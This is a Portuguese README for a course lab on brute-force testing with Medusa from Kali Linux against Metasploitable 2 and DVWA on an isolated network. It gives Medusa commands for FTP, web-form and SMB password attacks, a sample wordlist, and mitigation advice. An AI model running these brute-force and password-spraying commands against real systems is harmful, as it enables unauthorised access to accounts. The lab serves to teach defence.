# 🔐 Desafio DIO - Testes de Força Bruta com Medusa

Este projeto foi desenvolvido como parte de um desafio da [Digital Innovation One (DIO)](https://www.dio.me/), com o objetivo de implementar, documentar e compartilhar um **projeto prático de segurança ofensiva** utilizando **Kali Linux** e a ferramenta **Medusa**, em conjunto com ambientes vulneráveis como **Metasploitable 2** e **DVWA (Damn Vulnerable Web Application)**.

⚠️ **Aviso Importante**:  
Este projeto tem **finalidade exclusivamente educacional**. Não deve ser utilizado em ambientes de produção ou contra sistemas sem autorização explícita. O uso indevido pode ser ilegal e acarretar consequências sérias.  

---

## 📂 Estrutura do Projeto

- **Configuração do ambiente**  
  - Duas VMs no VirtualBox:  
    - **Kali Linux** → máquina atacante.  
    - **Metasploitable 2 / DVWA** → máquinas alvo vulneráveis.  
  - Rede interna configurada em modo **host-only** para isolamento.  

- **Cenários de ataque simulados**  
  - Força bruta em **FTP**.  
  - Automação de tentativas em formulário web (**DVWA**).  
  - Password spraying em **SMB** com enumeração de usuários.  

- **Documentação dos testes**  
  - Wordlists simples.  
  - Comandos utilizados.  
  - Validação de acessos.  
  - Recomendações de mitigação.  

---

## 🚀 Passo a Passo

### 1. Configuração do Ambiente
- Instalar e configurar **VirtualBox**.  
- Criar duas VMs:  
  - Kali Linux (atacante).  
  - Metasploitable 2 / DVWA (alvo).  
- Configurar rede **host-only** para comunicação interna.  

### 2. Ataques Simulados

#### 🔹 FTP (Metasploitable 2)
Exemplo de comando:
```bash
medusa -h 192.168.56.101 -u admin -P wordlist.txt -M ftp

#### 🔹 Formulário Web (DVWA)

Exemplo de comando:
```bash
medusa -h 192.168.56.102 -u admin -P wordlist.txt -M web-form -m FORM:"/dvwa/login.php:user=^USER^&pass=^PASS^:F=Login failed:S=Welcome"

#### 🔹 SMB (Metasploitable 2)
Exemplo de comando:
```bash
medusa -h 192.168.56.101 -U users.txt -P wordlist.txt -M smbnt

#### 📌 Wordlists

    Criadas manualmente com combinações simples de senhas.

    Exemplo (wordlist.txt):
	
	123456
    admin
    password
    qwerty
	
#### ✅ Validação dos Testes

    Acesso obtido em serviços vulneráveis.

    Registro dos comandos e resultados.

    Comparação entre diferentes wordlists e tempos de execução.

#### 🛡️ Recomendações de Mitigação

    Utilizar senhas fortes e únicas.

    Implementar bloqueio de conta após múltiplas tentativas falhas.

    Monitorar logs de autenticação para identificar tentativas suspeitas.

    Restringir acesso a serviços vulneráveis (FTP, SMB).

    Utilizar autenticação multifator (MFA) sempre que possível.

#### 📖 Reflexões

Este desafio permitiu compreender:

    Como funcionam ataques de força bruta e password spraying.

    A importância de boas práticas de segurança defensiva.

    O papel de ferramentas como Medusa em testes de penetração.

